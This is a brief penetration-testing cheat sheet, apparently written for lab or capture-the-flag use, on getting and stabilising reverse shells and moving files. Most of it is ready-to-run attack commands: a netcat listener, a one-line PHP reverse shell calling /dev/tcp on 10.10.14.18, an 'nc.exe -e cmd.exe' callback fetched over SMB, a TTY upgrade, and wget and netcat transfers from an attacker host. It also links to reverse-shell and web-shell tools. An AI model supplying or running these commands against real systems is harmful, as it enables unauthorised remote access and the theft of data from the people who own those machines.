## Getting a Reverse Shell

On Attacker machine:
`nc -lnvp portnumber`

On Target host:
Try one of this: http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

PHP Reverse Shell for Upload to Target: http://pentestmonkey.net/tools/web-shells/php-reverse-shell

Reverse Shell with extended functionality: https://github.com/epinna/weevely3

Tiny PHP reverse shell code in one line:
`<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.18/1337 0>&1'");`


## nc shell from web shell

```
~# smbserver.py share ~/smb
#start nc on attacker's machine
~# nc -lvp 555
```
execute from the webshell:

`\\10.10.14.22\smb\nc.exe -e cmd.exe 10.10.14.22 5555`

## Upgrading to a TTY shell:

`python -c 'import pty; pty.spawn("/bin/bash")'`
This gives us a partially interactive bash shell. To get a fully interactive shell, background the session (CTRL+ Z) and run the following in your terminal which tells your terminal to pass keyboard shortcuts to the shell.

`stty raw -echo`

Once that is done, run the command “fg” to bring netcat back to the foreground.

File Transfer

On Attacker machine:
`python -m SimpleHTTPServer`

On Target:
`wget attacker-adress/filename:port`

With Netcat:

`nc -l -p 1234 > out.file`

`nc -w 3 [destination] 1234 < out.file
